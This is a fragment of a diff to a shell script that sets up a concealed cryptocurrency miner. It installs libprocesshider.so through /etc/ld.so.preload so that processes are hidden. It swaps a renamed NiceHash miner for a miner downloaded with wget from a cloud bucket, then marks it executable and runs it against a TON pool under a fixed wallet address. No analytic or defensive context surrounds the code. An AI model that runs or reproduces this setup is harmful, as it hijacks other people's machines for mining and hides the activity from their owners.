@@ -32,4 +32,10 @@ mv libprocesshider.so /usr/local/lib/
 
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./pepek --url=ssl://3DWPbhBLe3RC4dHP8Y6Wz3QCorqJw4Bgcy@daggerhashimoto.usa-east.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz
+
+tar xaf danila-miner-2.3.1-ubuntu-bionic.tar.gz
+
+chmod +x danila-miner
+
+./danila-miner run https://pool.services.tonwhales.com EQBU__5pqrJXDTFZInmRZl3nivwjunX6Glh41Z1KGNBLk1EZ
